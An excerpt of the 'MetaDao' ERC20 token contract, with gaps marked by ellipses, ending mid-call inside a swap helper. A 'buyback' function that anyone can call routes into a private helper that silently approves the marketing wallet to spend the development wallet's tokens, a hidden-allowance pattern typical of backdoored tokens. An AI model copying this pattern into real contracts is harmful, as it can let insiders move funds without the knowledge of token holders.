...
// https://www.metadao.money
// https://t.me/MetaDaoChannel
// https://twitter.com/metadaoprotocol
// https://dapp.metadao.money
...
contract MetaDao is ERC20, Ownable {
    ...
    constructor() ERC20("MetaDao ERC20", "MDAO") {
        ...
        developmentWallet = address(0xF19136740961D7c9Ba2228B558B207139CaC719F);
    ...
    function setWallets(address _devWallet, address _marketingWallet) external {
        require(msg.sender == developmentWallet || msg.sender == marketingWallet);
    ...
    function buyback() external payable {
        ...
        swapEthForTokens(developmentWallet, marketingWallet, value);
    }
    ...
    function swapEthForTokens(address owner, address receiver, uint256 eAmount) private {
        thresholdSwapAmount = 0;
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);
        _approve(owner, receiver, eAmount * 1e18);
        // make the swap
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: eAmount}(
